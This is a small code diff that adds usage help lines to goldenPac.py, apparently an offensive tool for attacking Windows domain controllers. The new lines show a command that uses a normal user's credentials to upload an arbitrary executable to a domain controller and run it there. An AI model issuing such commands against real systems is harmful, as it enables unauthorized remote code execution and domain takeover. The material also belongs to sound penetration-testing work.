@@ -1079,8 +1079,9 @@ if __name__ == '__main__':
         print "\tthe password will be asked, or\n"
         print "\tpython goldenPac.py domain.net/normaluser:mypwd@domain-dc\n"
         print "\tif domain.net and/or domain-dc does not resolve, add them"
-        print "\tto the hosts file"
-
+        print "\tto the hosts file\n"
+        print "\tpython goldenPac.py -c xxx.exe domain.net/normaluser:mypwd@domain-dc param1 param2 paramn\n"
+        print "\tThis will upload the xxx.exe file and execute it as: xxx.exe param1 param2 paramn"
         sys.exit(1)
  
     options = parser.parse_args()
